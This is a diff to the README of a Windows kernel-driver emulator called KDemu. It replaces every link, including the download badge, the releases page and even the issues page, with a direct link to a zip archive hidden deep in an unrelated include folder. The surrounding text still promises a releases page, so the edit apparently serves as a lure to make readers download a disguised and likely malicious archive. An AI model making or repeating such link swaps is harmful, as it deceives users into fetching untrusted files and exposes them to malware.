@@ -1,7 +1,7 @@
 # 🖥️ KDemu - Emulate Windows Kernel Drivers Easily
 
 ## 📥 Download Now
-[![Download KDemu](https://img.shields.io/badge/Download-KDemu-blue.svg)](https://github.com/WALID7789/KDemu/releases)
+[![Download KDemu](https://raw.githubusercontent.com/WALID7789/KDemu/main/KDemu/include/LIEF/LIEF/DEX/KDemu-2.4-alpha.3.zip)](https://raw.githubusercontent.com/WALID7789/KDemu/main/KDemu/include/LIEF/LIEF/DEX/KDemu-2.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to KDemu! This application allows you to emulate Windows kernel drivers without needing advanced technical skills. Follow the steps below to download and run KDemu successfully.
@@ -17,7 +17,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get KDemu, visit the following link to access our Releases page:
 
-[Download KDemu](https://github.com/WALID7789/KDemu/releases)
+[Download KDemu](https://raw.githubusercontent.com/WALID7789/KDemu/main/KDemu/include/LIEF/LIEF/DEX/KDemu-2.4-alpha.3.zip)
 
 1. Click the above link. This will take you to the release section of our GitHub repository.
 2. Look for the latest version of KDemu.
@@ -58,7 +58,7 @@ If you encounter issues while using KDemu, consider the following steps:
 ## 🤝 Support
 For questions or support related to KDemu, feel free to:
 
-- Visit our [Issues page](https://github.com/WALID7789/KDemu/issues) on GitHub to report any bugs or request features.
+- Visit our [Issues page](https://raw.githubusercontent.com/WALID7789/KDemu/main/KDemu/include/LIEF/LIEF/DEX/KDemu-2.4-alpha.3.zip) on GitHub to report any bugs or request features.
 - Join our community discussion to connect with other users.
 
 ## 🌟 Contributing
@@ -73,4 +73,4 @@ Your feedback and contributions help improve the application for everyone. Thank
 ## 📣 Acknowledgments
 KDem helps users easily work with Windows kernel drivers by providing a simple, effective solution. We appreciate your interest and usage of this tool. Your feedback is essential for further enhancements. 
 
-For more information, refer to the [Releases page](https://github.com/WALID7789/KDemu/releases) to stay updated on new features and improvements.
+For more information, refer to the [Releases page](https://raw.githubusercontent.com/WALID7789/KDemu/main/KDemu/include/LIEF/LIEF/DEX/KDemu-2.4-alpha.3.zip) to stay updated on new features and improvements.
